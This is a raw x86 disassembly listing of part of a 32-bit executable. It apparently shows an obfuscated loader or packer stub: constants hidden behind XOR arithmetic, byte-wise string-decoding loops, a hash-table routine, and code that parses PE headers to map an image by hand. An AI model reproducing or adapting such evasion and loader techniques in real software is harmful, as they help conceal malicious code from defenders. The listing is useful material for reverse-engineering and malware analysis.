  427fe2:	setne  cl
  427fe5:	mov    eax,ecx
  427fe7:	pop    ebp
  427fe8:	ret    0x4
  427feb:	mov    ecx,DWORD PTR [edi+0x188]
  427ff1:	push   ebx
  427ff2:	jmp    0x428007
  427ff4:	xor    eax,0x8a98
  427ff9:	add    eax,0x3b5a
  427ffe:	mov    WORD PTR [ecx],ax
  428001:	add    ecx,0x2
  428004:	add    edx,0x2
  428007:	movzx  eax,WORD PTR [edx]
  42800a:	mov    ebx,0x4e3e
  42800f:	cmp    ax,bx
  428012:	jne    0x427ff4
  428014:	xor    eax,eax
  428016:	mov    WORD PTR [ecx],ax
  428019:	mov    eax,DWORD PTR [edi+0x188]
  42801f:	pop    ebx
  428020:	ret    
  428021:	push   edi
  428022:	mov    edi,eax
  428024:	mov    eax,DWORD PTR [esi+0x188]
  42802a:	shl    edi,0x6
  42802d:	add    eax,edi
  42802f:	jmp    0x42803a
  428031:	xor    cl,0x7c
  428034:	inc    cl
  428036:	mov    BYTE PTR [eax],cl
  428038:	inc    eax
  428039:	inc    edx
  42803a:	mov    cl,BYTE PTR [edx]
  42803c:	cmp    cl,0x83
  42803f:	jne    0x428031
  428041:	mov    BYTE PTR [eax],0x0
  428044:	mov    eax,DWORD PTR [esi+0x188]
  42804a:	add    eax,edi
  42804c:	pop    edi
  42804d:	ret    
  42804e:	push   ebp
  42804f:	mov    ebp,esp
  428051:	sub    esp,0x14
  428054:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  42805b:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  428062:	mov    eax,DWORD PTR [ebx]
  428064:	mov    DWORD PTR [ebp-0x8],eax
  428067:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42806e:	push   esi
  42806f:	push   edi
  428070:	mov    DWORD PTR [ebp-0x14],0xead71885
  428077:	mov    edi,DWORD PTR [ebp-0x4]
  42807a:	mov    ecx,DWORD PTR [ebp-0x10]
  42807d:	mov    eax,0x75108aa
  428082:	xor    edi,eax
  428084:	mov    edx,0x3272f1
  428089:	xor    ecx,eax
  42808b:	add    edi,edx
  42808d:	add    ecx,edx
  42808f:	imul   edi,ecx
  428092:	jmp    0x4280da
  428094:	mov    ecx,DWORD PTR [ebp-0x8]
  428097:	mov    esi,DWORD PTR [ebp-0x4]
  42809a:	xor    ecx,eax
  42809c:	xor    esi,eax
  42809e:	add    ecx,edx
  4280a0:	add    esi,edx
  4280a2:	test   esi,ecx
  4280a4:	mov    esi,DWORD PTR [ebp-0x8]
  4280a7:	mov    ecx,DWORD PTR [ebp-0x4]
  4280aa:	je     0x4280c1
  4280ac:	xor    ecx,eax
  4280ae:	xor    esi,eax
  4280b0:	add    ecx,edx
  4280b2:	add    esi,edx
  4280b4:	shr    esi,cl
  4280b6:	mov    ecx,DWORD PTR [ebp-0x14]
  4280b9:	xor    ecx,eax
  4280bb:	add    ecx,edx
  4280bd:	xor    esi,ecx
  4280bf:	jmp    0x4280cb
  4280c1:	xor    esi,eax
  4280c3:	xor    ecx,eax
  4280c5:	add    esi,edx
  4280c7:	add    ecx,edx
  4280c9:	shr    esi,cl
  4280cb:	mov    DWORD PTR [ebp-0x8],esi
  4280ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4280d1:	xor    ecx,eax
  4280d3:	lea    edi,[edi+ecx*1+0x3272f1]
  4280da:	mov    ecx,DWORD PTR [ebp-0xc]
  4280dd:	mov    esi,DWORD PTR [ebp-0x4]
  4280e0:	xor    esi,eax
  4280e2:	xor    ecx,eax
  4280e4:	sub    ecx,esi
  4280e6:	cmp    edi,ecx
  4280e8:	jbe    0x428094
  4280ea:	mov    eax,DWORD PTR [ebp-0x8]
  4280ed:	pop    edi
  4280ee:	mov    DWORD PTR [ebx],eax
  4280f0:	mov    eax,DWORD PTR [ebp-0x8]
  4280f3:	pop    esi
  4280f4:	leave  
  4280f5:	ret    
  4280f6:	push   ebp
  4280f7:	mov    ebp,esp
  4280f9:	sub    esp,0x38
  4280fc:	push   ebx
  4280fd:	mov    ebx,0xf89c85a5
  428102:	mov    DWORD PTR [ebp-0x4],ebx
  428105:	lea    ecx,[ebx+0x15]
  428108:	mov    DWORD PTR [ebp-0x24],ecx
  42810b:	mov    eax,DWORD PTR [ebp-0x4]
  42810e:	mov    edx,DWORD PTR [ebp+0x8]
  428111:	push   esi
  428112:	mov    esi,0x75108aa
  428117:	xor    eax,esi
  428119:	push   edi
  42811a:	mov    edi,0x3272f1
  42811f:	add    eax,edi
  428121:	cmp    edx,eax
  428123:	mov    eax,DWORD PTR [ebp-0x4]
  428126:	je     0x42828a
  42812c:	mov    edx,DWORD PTR [ebp+0xc]
  42812f:	xor    eax,esi
  428131:	add    eax,edi
  428133:	cmp    edx,eax
  428135:	je     0x428287
  42813b:	mov    eax,DWORD PTR [ebp+0x10]
  42813e:	mov    edx,DWORD PTR [ebp+0xc]
  428141:	mov    DWORD PTR [ebp-0x14],eax
  428144:	mov    eax,DWORD PTR [ebp+0x8]
  428147:	mov    DWORD PTR [ebp-0x18],0xf89c853f
  42814e:	mov    DWORD PTR [ebp-0xc],eax
  428151:	lea    eax,[ebx+0x16]
  428154:	mov    DWORD PTR [ebp-0x1c],eax
  428157:	mov    DWORD PTR [ebp-0x10],ebx
  42815a:	mov    DWORD PTR [ebp+0xc],ecx
  42815d:	mov    DWORD PTR [ebp+0x10],eax
  428160:	mov    eax,DWORD PTR [ebp+0xc]
  428163:	xor    eax,esi
  428165:	mov    DWORD PTR [ebp-0x20],edx
  428168:	sub    edx,eax
  42816a:	sub    edx,edi
  42816c:	mov    DWORD PTR [ebp+0x8],edx
  42816f:	mov    DWORD PTR [ebp-0x8],0xf89c85be
  428176:	jmp    0x428277
  42817b:	mov    eax,DWORD PTR [ebp+0xc]
  42817e:	mov    ecx,DWORD PTR [ebp+0xc]
  428181:	xor    eax,esi
  428183:	xor    ecx,esi
  428185:	lea    ecx,[eax+ecx*1+0x64e5e2]
  42818c:	mov    eax,DWORD PTR [ebp+0x8]
  42818f:	xor    edx,edx
  428191:	div    ecx
  428193:	mov    eax,DWORD PTR [ebp+0x10]
  428196:	mov    ecx,DWORD PTR [ebp+0xc]
  428199:	xor    eax,esi
  42819b:	xor    ecx,esi
  42819d:	sub    eax,ecx
  42819f:	cmp    edx,eax
  4281a1:	jne    0x428236
  4281a7:	mov    eax,DWORD PTR [ebp+0x8]
  4281aa:	mov    ecx,DWORD PTR [ebp-0xc]
  4281ad:	mov    dl,BYTE PTR [eax+ecx*1]
  4281b0:	mov    eax,DWORD PTR [ebp-0x10]
  4281b3:	mov    ecx,DWORD PTR [ebp-0x8]
  4281b6:	xor    eax,esi
  4281b8:	xor    ecx,esi
  4281ba:	add    eax,edi
  4281bc:	add    ecx,edi
  4281be:	cmp    eax,ecx
  4281c0:	jae    0x428208
  4281c2:	lea    ecx,[eax-0x3272f1]
  4281c8:	mov    DWORD PTR [ebp-0x4],ecx
  4281cb:	mov    ebx,DWORD PTR [ebp-0x4]
  4281ce:	xor    ebx,esi
  4281d0:	add    ebx,0x7f55d8fb
  4281d6:	lea    ecx,[ebp+eax*4-0x38]
  4281da:	mov    DWORD PTR [ecx],ebx
  4281dc:	mov    ebx,DWORD PTR [ecx]
  4281de:	cmp    ebx,0x244ecb98
  4281e4:	jbe    0x4281ee
  4281e6:	add    DWORD PTR [ecx],0x405fcd9
  4281ec:	jmp    0x4281f4
  4281ee:	add    DWORD PTR [ecx],0xfdaf4327
  4281f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4281f7:	xor    ecx,esi
  4281f9:	inc    eax
  4281fa:	inc    DWORD PTR [ebp-0x4]
  4281fd:	add    ecx,edi
  4281ff:	cmp    eax,ecx
  428201:	jb     0x4281cb
  428203:	mov    ebx,0xf89c85a5
  428208:	cmp    DWORD PTR [ebp-0x14],0x0
  42820c:	jne    0x428215
  42820e:	xor    dl,0x7c
  428211:	inc    dl
  428213:	jmp    0x42822b
  428215:	mov    eax,DWORD PTR [ebp-0x18]
  428218:	xor    al,0xaa
  42821a:	mov    cl,0xf
  42821c:	sub    cl,al
  42821e:	add    dl,cl
  428220:	mov    ecx,DWORD PTR [ebp-0x1c]
  428223:	xor    cl,0xaa
  428226:	sub    cl,0xf
  428229:	ror    dl,cl
  42822b:	xor    eax,eax
  42822d:	mov    eax,DWORD PTR [ebp+0x8]
  428230:	mov    ecx,DWORD PTR [ebp-0xc]
  428233:	mov    BYTE PTR [eax+ecx*1],dl
  428236:	mov    eax,DWORD PTR [ebp+0x8]
  428239:	mov    ecx,DWORD PTR [ebp-0x10]
  42823c:	sub    eax,edi
  42823e:	xor    eax,esi
  428240:	cmp    eax,ecx
  428242:	jne    0x428265
  428244:	mov    eax,DWORD PTR [ebp+0x10]
  428247:	mov    ecx,DWORD PTR [ebp+0xc]
  42824a:	xor    eax,esi
  42824c:	xor    ecx,esi
  42824e:	sub    eax,ecx
  428250:	mov    ecx,DWORD PTR [ebp-0x20]
  428253:	sub    eax,edi
  428255:	xor    eax,esi
  428257:	mov    DWORD PTR [ebp+0x10],eax
  42825a:	mov    eax,DWORD PTR [ebp+0xc]
  42825d:	xor    eax,esi
  42825f:	sub    ecx,eax
  428261:	sub    ecx,edi
  428263:	jmp    0x428274
  428265:	mov    eax,DWORD PTR [ebp+0xc]
  428268:	xor    eax,esi
  42826a:	mov    ecx,0xffcd8d0f
  42826f:	sub    ecx,eax
  428271:	add    ecx,DWORD PTR [ebp+0x8]
  428274:	mov    DWORD PTR [ebp+0x8],ecx
  428277:	mov    eax,DWORD PTR [ebp+0x10]
  42827a:	cmp    eax,ebx
  42827c:	jne    0x42817b
  428282:	mov    eax,DWORD PTR [ebp-0x24]
  428285:	jmp    0x42828a
  428287:	mov    eax,DWORD PTR [ebp-0x4]
  42828a:	xor    eax,esi
  42828c:	add    eax,edi
  42828e:	pop    edi
  42828f:	pop    esi
  428290:	pop    ebx
  428291:	leave  
  428292:	ret    0xc
  428295:	push   ebp
  428296:	mov    ebp,esp
  428298:	sub    esp,0x420
  42829e:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  4282a5:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  4282ac:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  4282b3:	push   ebx
  4282b4:	mov    DWORD PTR [ebp-0x1c],0xf89c85a4
  4282bb:	mov    eax,DWORD PTR [ebp-0x14]
  4282be:	push   esi
  4282bf:	mov    esi,0x75108aa
  4282c4:	push   edi
  4282c5:	xor    eax,esi
  4282c7:	mov    edi,0x3272f1
  4282cc:	add    eax,edi
  4282ce:	mov    DWORD PTR [ebp-0x8],eax
  4282d1:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  4282d8:	mov    DWORD PTR [ebp-0x4],0xead71885
  4282df:	mov    DWORD PTR [ebp-0x10],0x8
  4282e6:	mov    ecx,ecx
  4282e8:	mov    eax,DWORD PTR [ebp-0xc]
  4282eb:	mov    ecx,DWORD PTR [ebp-0x14]
  4282ee:	xor    eax,esi
  4282f0:	xor    ecx,esi
  4282f2:	add    eax,edi
  4282f4:	add    ecx,edi
  4282f6:	imul   eax,ecx
  4282f9:	jmp    0x42832c
  4282fb:	mov    eax,DWORD PTR [ebp-0x4]
  4282fe:	sub    eax,edi
  428300:	xor    eax,esi
  428302:	mov    DWORD PTR [ebp-0x8],eax
  428305:	lea    ebx,[ebp-0x8]
  428308:	call   0x42804e
  42830d:	mov    DWORD PTR [ebp-0x8],eax
  428310:	mov    eax,DWORD PTR [ebp-0x8]
  428313:	mov    ecx,DWORD PTR [ebp-0x4]
  428316:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  42831d:	mov    eax,DWORD PTR [ebp-0xc]
  428320:	mov    ecx,DWORD PTR [ebp-0x4]
  428323:	xor    eax,esi
  428325:	lea    eax,[eax+ecx*1+0x3272f1]
  42832c:	mov    DWORD PTR [ebp-0x4],eax
  42832f:	mov    eax,DWORD PTR [ebp-0x18]
  428332:	mov    ecx,DWORD PTR [ebp-0xc]
  428335:	xor    ecx,esi
  428337:	xor    eax,esi
  428339:	sub    eax,ecx
  42833b:	mov    ecx,DWORD PTR [ebp-0x4]
  42833e:	cmp    ecx,eax
  428340:	jbe    0x4282fb
  428342:	mov    eax,DWORD PTR [ebp-0x1c]
  428345:	xor    eax,esi
  428347:	add    eax,edi
  428349:	mov    DWORD PTR [ebp-0x8],eax
  42834c:	mov    DWORD PTR [ebp-0x18],0xf89c86a4
  428353:	mov    ebx,ebx
  428355:	jmp    0x4283b8
  428357:	mov    ecx,DWORD PTR [ebp-0x20]
  42835a:	mov    eax,DWORD PTR [ebp-0x8]
  42835d:	xor    ecx,esi
  42835f:	add    ecx,edi
  428361:	shr    eax,cl
  428363:	mov    DWORD PTR [ebp-0x4],eax
  428366:	mov    eax,DWORD PTR [ebp+0x8]
  428369:	mov    cl,BYTE PTR [eax]
  42836b:	mov    BYTE PTR [ebp+0xb],cl
  42836e:	mov    cl,BYTE PTR [ebp+0xb]
  428371:	mov    edx,DWORD PTR [ebp-0x8]
  428374:	movzx  ecx,cl
  428377:	xor    ecx,edx
  428379:	mov    DWORD PTR [ebp+0x8],ecx
  42837c:	mov    ecx,DWORD PTR [ebp-0x18]
  42837f:	mov    edx,DWORD PTR [ebp+0x8]
  428382:	xor    ecx,esi
  428384:	add    ecx,edi
  428386:	and    ecx,edx
  428388:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  42838f:	mov    edx,DWORD PTR [ebp-0x4]
  428392:	xor    ecx,edx
  428394:	mov    DWORD PTR [ebp-0x8],ecx
  428397:	mov    ecx,DWORD PTR [ebp-0xc]
  42839a:	xor    ecx,esi
  42839c:	lea    eax,[eax+ecx*1+0x3272f1]
  4283a3:	mov    DWORD PTR [ebp+0x8],eax
  4283a6:	mov    eax,DWORD PTR [ebp-0xc]
  4283a9:	xor    eax,esi
  4283ab:	mov    ecx,0xffcd8d0f
  4283b0:	sub    ecx,eax
  4283b2:	add    ecx,DWORD PTR [ebp-0x10]
  4283b5:	mov    DWORD PTR [ebp-0x10],ecx
  4283b8:	mov    eax,DWORD PTR [ebp-0x14]
  4283bb:	mov    ecx,DWORD PTR [ebp-0x10]
  4283be:	xor    eax,esi
  4283c0:	add    eax,edi
  4283c2:	cmp    ecx,eax
  4283c4:	jne    0x428357
  4283c6:	mov    eax,DWORD PTR [ebp-0x1c]
  4283c9:	mov    ecx,DWORD PTR [ebp-0x8]
  4283cc:	xor    eax,esi
  4283ce:	add    eax,edi
  4283d0:	pop    edi
  4283d1:	pop    esi
  4283d2:	xor    eax,ecx
  4283d4:	pop    ebx
  4283d5:	leave  
  4283d6:	ret    0x4
  4283d9:	push   ebp
  4283da:	mov    ebp,esp
  4283dc:	mov    eax,DWORD PTR [ebp+0x1c]
  4283df:	mov    ecx,DWORD PTR [ebp+0x8]
  4283e2:	mov    edx,DWORD PTR [ebp+0x10]
  4283e5:	mov    eax,DWORD PTR [eax+0x190]
  4283eb:	mov    eax,DWORD PTR [eax]
  4283ed:	sub    esp,0x64
  4283f0:	push   ebx
  4283f1:	push   esi
  4283f2:	push   edi
  4283f3:	mov    edi,0x75108aa
  4283f8:	xor    ecx,edi
  4283fa:	mov    ebx,0x3272f1
  4283ff:	add    ecx,ebx
  428401:	cmp    ecx,edx
  428403:	jne    0x428414
  428405:	or     DWORD PTR ds:0x3750c3f,0x4263eb2c
  42840f:	jmp    0x428910
  428414:	mov    ecx,DWORD PTR [ebp+0x8]
  428417:	mov    esi,DWORD PTR [ebp+0x14]
  42841a:	mov    edx,DWORD PTR [esi]
  42841c:	xor    ecx,edi
  42841e:	add    ecx,ebx
  428420:	cmp    edx,ecx
  428422:	je     0x4288cb
  428428:	mov    ecx,DWORD PTR [ebp+0x1c]
  42842b:	mov    DWORD PTR [ebp-0x1c],eax
  42842e:	mov    DWORD PTR [ebp+0x1c],ecx
  428431:	mov    ecx,DWORD PTR [ebp+0x18]
  428434:	mov    eax,DWORD PTR [esi]
  428436:	mov    DWORD PTR [ebp-0x20],eax
  428439:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  428440:	mov    edx,0xf89c85ba
  428445:	mov    DWORD PTR [ebp-0x8],edx
  428448:	mov    eax,DWORD PTR [ebp+0x1c]
  42844b:	mov    DWORD PTR [ebp+0x1c],eax
  42844e:	mov    eax,DWORD PTR [ebp+0x1c]
  428451:	mov    eax,DWORD PTR [eax+0x190]
  428457:	mov    eax,DWORD PTR [eax]
  428459:	mov    DWORD PTR [ebp-0x24],ecx
  42845c:	mov    ecx,DWORD PTR [ebp+0x1c]
  42845f:	mov    ecx,DWORD PTR [ecx+0x190]
  428465:	mov    ecx,DWORD PTR [ecx]
  428467:	add    ecx,DWORD PTR [eax+0x3c]
  42846a:	mov    DWORD PTR [ebp+0x10],ecx
  42846d:	mov    eax,DWORD PTR [ebp+0x8]
  428470:	xor    eax,edi
  428472:	add    eax,ebx
  428474:	mov    DWORD PTR [ebp-0x4],eax
  428477:	mov    eax,DWORD PTR [ebp+0x8]
  42847a:	xor    eax,edi
  42847c:	add    eax,ebx
  42847e:	mov    DWORD PTR [ebp+0x18],eax
  428481:	mov    eax,DWORD PTR [ebp+0x10]
  428484:	mov    eax,DWORD PTR [eax+0x50]
  428487:	sub    eax,0xc
  42848a:	mov    DWORD PTR [ebp-0x28],eax
  42848d:	mov    eax,DWORD PTR [ebp+0x10]
  428490:	mov    eax,DWORD PTR [eax+0x38]
  428493:	mov    ecx,DWORD PTR [ebp+0x10]
  428496:	dec    eax
  428497:	test   DWORD PTR [ecx+0x54],eax
  42849a:	mov    eax,DWORD PTR [ebp+0x10]
  42849d:	je     0x4284b7
  42849f:	mov    eax,DWORD PTR [eax+0x38]
  4284a2:	mov    ecx,DWORD PTR [ebp+0x10]
  4284a5:	mov    ecx,DWORD PTR [ecx+0x54]
  4284a8:	dec    eax
  4284a9:	not    eax
  4284ab:	and    ecx,eax
  4284ad:	mov    eax,DWORD PTR [ebp+0x10]
  4284b0:	mov    eax,DWORD PTR [eax+0x38]
  4284b3:	add    eax,ecx
  4284b5:	jmp    0x4284ba
  4284b7:	mov    eax,DWORD PTR [eax+0x54]
  4284ba:	mov    DWORD PTR [ebp+0x1c],eax
  4284bd:	mov    eax,DWORD PTR [ebp+0x8]
  4284c0:	xor    eax,edi
  4284c2:	add    eax,ebx
  4284c4:	mov    DWORD PTR [ebp+0x18],eax
  4284c7:	mov    eax,DWORD PTR [ebp+0x8]
  4284ca:	xor    eax,edi
  4284cc:	add    eax,ebx
  4284ce:	mov    DWORD PTR [ebp+0x18],eax
  4284d1:	mov    eax,DWORD PTR [ebp+0x8]
  4284d4:	mov    ecx,DWORD PTR [ebp-0x24]
  4284d7:	xor    eax,edi
  4284d9:	add    eax,ebx
  4284db:	mov    DWORD PTR [ecx],eax
  4284dd:	mov    DWORD PTR [ebp+0x18],edx
  4284e0:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  4284e7:	mov    DWORD PTR [ebp+0x18],0xf89c85b8
  4284ee:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  4284f5:	mov    eax,DWORD PTR [ebp-0x8]
  4284f8:	mov    ecx,DWORD PTR [ebp+0x1c]
  4284fb:	xor    eax,edi
  4284fd:	add    eax,ebx
  4284ff:	imul   eax,ecx
  428502:	mov    ecx,DWORD PTR [ebp+0x8]
  428505:	mov    edx,DWORD PTR [ebp-0x28]
  428508:	xor    ecx,edi
  42850a:	lea    ecx,[ecx+edx*1+0x3272f1]
  428511:	cmp    eax,ecx
  428513:	jae    0x4288c4
  428519:	mov    eax,DWORD PTR [ebp+0x8]
  42851c:	xor    eax,edi
  42851e:	add    eax,ebx
  428520:	mov    DWORD PTR [ebp+0x18],eax
  428523:	mov    eax,DWORD PTR [ebp+0x1c]
  428526:	add    eax,DWORD PTR [ebp-0x1c]
  428529:	mov    DWORD PTR [ebp-0x4],eax
  42852c:	push   DWORD PTR [ebp-0x4]
  42852f:	mov    esi,DWORD PTR [ebp-0x1c]
  428532:	mov    ecx,DWORD PTR [ebp+0x10]
  428535:	call   0x427689
  42853a:	mov    DWORD PTR [ebp+0xc],eax
  42853d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  428544:	mov    eax,DWORD PTR [ebp-0x18]
  428547:	xor    eax,edi
  428549:	lea    ecx,[ebp-0x40]
  42854c:	add    eax,ebx
  42854e:	push   ecx
  42854f:	call   0x427c1b
  428554:	mov    eax,DWORD PTR [ebp+0xc]
  428557:	test   eax,eax
  428559:	je     0x4285a9
  42855b:	mov    eax,DWORD PTR [ebp-0x18]
  42855e:	xor    eax,edi
  428560:	add    eax,ebx
  428562:	push   eax
  428563:	push   DWORD PTR [ebp+0xc]
  428566:	lea    eax,[ebp-0x40]
  428569:	push   eax
  42856a:	call   0x427b11
  42856f:	mov    eax,DWORD PTR [ebp-0x4]
  428572:	mov    DWORD PTR [ebp-0x18],eax
  428575:	mov    eax,DWORD PTR [ebp-0x18]
  428578:	mov    ecx,DWORD PTR [ebp-0x1c]
  42857b:	sub    eax,ecx
  42857d:	mov    DWORD PTR [ebp-0x18],eax
  428580:	mov    eax,DWORD PTR [ebp+0xc]
  428583:	mov    ecx,DWORD PTR [ebp+0xc]
  428586:	mov    eax,DWORD PTR [eax+0x10]
  428589:	add    eax,DWORD PTR [ecx+0xc]
  42858c:	mov    ecx,DWORD PTR [ebp-0x18]
  42858f:	cmp    ecx,eax
  428591:	jb     0x4285a9
  428593:	mov    eax,DWORD PTR [ebp+0xc]
  428596:	mov    eax,DWORD PTR [eax+0xc]
  428599:	mov    ecx,DWORD PTR [ebp+0xc]
  42859c:	add    eax,DWORD PTR [ecx+0x8]
  42859f:	mov    ecx,DWORD PTR [ebp-0x18]
  4285a2:	sub    eax,ecx
  4285a4:	jmp    0x428897
  4285a9:	push   0xc
  4285ab:	push   DWORD PTR [ebp-0x4]
  4285ae:	lea    eax,[ebp-0x4c]
  4285b1:	push   eax
  4285b2:	call   0x427b11
  4285b7:	mov    eax,0xf89c85a5
  4285bc:	mov    DWORD PTR [ebp-0x2c],eax
  4285bf:	mov    DWORD PTR [ebp-0x30],0xf89c85ba
  4285c6:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  4285cd:	mov    DWORD PTR [ebp-0x38],0xf89c85b8
  4285d4:	lea    ecx,[ebp-0x2c]
  4285d7:	mov    DWORD PTR [ebp-0xc],ecx
  4285da:	lea    ecx,[ebp-0x30]
  4285dd:	mov    DWORD PTR [ebp-0x10],ecx
  4285e0:	lea    ecx,[ebp-0x34]
  4285e3:	mov    DWORD PTR [ebp+0xc],ecx
  4285e6:	lea    ecx,[ebp-0x38]
  4285e9:	mov    DWORD PTR [ebp-0x14],ecx
  4285ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4285ef:	xor    ecx,edi
  4285f1:	add    ecx,ebx
  4285f3:	mov    DWORD PTR [ebp-0x18],ecx
  4285f6:	jmp    0x4287f2
  4285fb:	cmp    eax,0xf89c85bb
  428600:	je     0x428804
  428606:	mov    ecx,DWORD PTR [ebp-0x8]
  428609:	xor    ecx,edi
  42860b:	mov    esi,eax
  42860d:	add    ecx,ebx
  42860f:	mov    DWORD PTR [ebp+0x18],ecx
  428612:	mov    eax,DWORD PTR [ebp-0x18]
  428615:	xor    esi,edi
  428617:	lea    eax,[eax+esi*1+0x3272f1]
  42861e:	mov    DWORD PTR [ebp-0x18],eax
  428621:	mov    eax,DWORD PTR [ebp-0x8]
  428624:	mov    ecx,DWORD PTR [ebp-0x18]
  428627:	xor    eax,edi
  428629:	add    eax,ebx
  42862b:	cmp    ecx,eax
  42862d:	jne    0x428642
  42862f:	mov    eax,DWORD PTR [ebp+0x8]
  428632:	xor    eax,edi
  428634:	add    eax,ebx
  428636:	push   eax
  428637:	push   0xc
  428639:	lea    eax,[ebp-0x4c]
  42863c:	push   eax
  42863d:	call   0x4280f6
  428642:	mov    eax,DWORD PTR [ebp-0xc]
  428645:	mov    eax,DWORD PTR [eax]
  428647:	xor    eax,edi
  428649:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428650:	mov    ecx,DWORD PTR [ebp+0x8]
  428653:	xor    ecx,edi
  428655:	movzx  eax,al
  428658:	add    ecx,ebx
  42865a:	cmp    eax,ecx
  42865c:	je     0x4287da
  428662:	mov    eax,DWORD PTR [ebp-0x10]
  428665:	mov    eax,DWORD PTR [eax]
  428667:	xor    eax,edi
  428669:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428670:	mov    ecx,DWORD PTR [ebp+0x8]
  428673:	xor    ecx,edi
  428675:	movzx  eax,al
  428678:	add    ecx,ebx
  42867a:	cmp    eax,ecx
  42867c:	je     0x4287da
  428682:	mov    eax,DWORD PTR [ebp+0xc]
  428685:	mov    eax,DWORD PTR [eax]
  428687:	xor    eax,edi
  428689:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428690:	mov    ecx,DWORD PTR [ebp+0x8]
  428693:	xor    ecx,edi
  428695:	movzx  eax,al
  428698:	add    ecx,ebx
  42869a:	cmp    eax,ecx
  42869c:	je     0x4287da
  4286a2:	mov    eax,DWORD PTR [ebp-0x14]
  4286a5:	mov    eax,DWORD PTR [eax]
  4286a7:	xor    eax,edi
  4286a9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4286b0:	mov    ecx,DWORD PTR [ebp+0x8]
  4286b3:	xor    ecx,edi
  4286b5:	movzx  eax,al
  4286b8:	add    ecx,ebx
  4286ba:	cmp    eax,ecx
  4286bc:	je     0x4287da
  4286c2:	mov    eax,DWORD PTR [ebp-0x10]
  4286c5:	mov    eax,DWORD PTR [eax]
  4286c7:	xor    eax,edi
  4286c9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4286d0:	mov    ecx,DWORD PTR [ebp-0xc]
  4286d3:	mov    ecx,DWORD PTR [ecx]
  4286d5:	xor    ecx,edi
  4286d7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4286de:	xor    al,cl
  4286e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4286e3:	mov    ecx,DWORD PTR [ecx]
  4286e5:	xor    ecx,edi
  4286e7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4286ee:	or     al,cl
  4286f0:	mov    ecx,DWORD PTR [ebp-0xc]
  4286f3:	mov    ecx,DWORD PTR [ecx]
  4286f5:	xor    ecx,edi
  4286f7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  4286fe:	cmp    cl,al
  428700:	jne    0x4287da
  428706:	mov    eax,DWORD PTR [ebp+0xc]
  428709:	mov    eax,DWORD PTR [eax]
  42870b:	xor    eax,edi
  42870d:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428714:	mov    ecx,DWORD PTR [ebp-0x10]
  428717:	mov    ecx,DWORD PTR [ecx]
  428719:	xor    ecx,edi
  42871b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428722:	xor    al,cl
  428724:	mov    ecx,DWORD PTR [ebp-0x14]
  428727:	mov    ecx,DWORD PTR [ecx]
  428729:	xor    ecx,edi
  42872b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428732:	or     al,cl
  428734:	mov    ecx,DWORD PTR [ebp-0x10]
  428737:	mov    ecx,DWORD PTR [ecx]
  428739:	xor    ecx,edi
  42873b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428742:	cmp    cl,al
  428744:	jne    0x4287da
  42874a:	mov    eax,DWORD PTR [ebp-0x14]
  42874d:	mov    eax,DWORD PTR [eax]
  42874f:	xor    eax,edi
  428751:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428758:	mov    ecx,DWORD PTR [ebp+0xc]
  42875b:	mov    ecx,DWORD PTR [ecx]
  42875d:	xor    ecx,edi
  42875f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428766:	xor    al,cl
  428768:	mov    ecx,DWORD PTR [ebp-0xc]
  42876b:	mov    ecx,DWORD PTR [ecx]
  42876d:	xor    ecx,edi
  42876f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428776:	or     al,cl
  428778:	mov    ecx,DWORD PTR [ebp+0xc]
  42877b:	mov    ecx,DWORD PTR [ecx]
  42877d:	xor    ecx,edi
  42877f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428786:	cmp    cl,al
  428788:	jne    0x4287da
  42878a:	mov    eax,DWORD PTR [ebp-0x14]
  42878d:	mov    eax,DWORD PTR [eax]
  42878f:	xor    eax,edi
  428791:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428798:	mov    ecx,DWORD PTR [ebp-0xc]
  42879b:	mov    ecx,DWORD PTR [ecx]
  42879d:	xor    ecx,edi
  42879f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4287a6:	xor    al,cl
  4287a8:	mov    ecx,DWORD PTR [ebp-0x10]
  4287ab:	mov    ecx,DWORD PTR [ecx]
  4287ad:	xor    ecx,edi
  4287af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4287b6:	or     al,cl
  4287b8:	mov    ecx,DWORD PTR [ebp-0x14]
  4287bb:	mov    ecx,DWORD PTR [ecx]
  4287bd:	xor    ecx,edi
  4287bf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  4287c6:	cmp    cl,al
  4287c8:	jne    0x4287da
  4287ca:	lea    eax,[ebp-0x4c]
  4287cd:	push   eax
  4287ce:	call   0x428295
  4287d3:	mov    ecx,DWORD PTR [ebp-0x44]
  4287d6:	cmp    eax,ecx
  4287d8:	je     0x4287e4
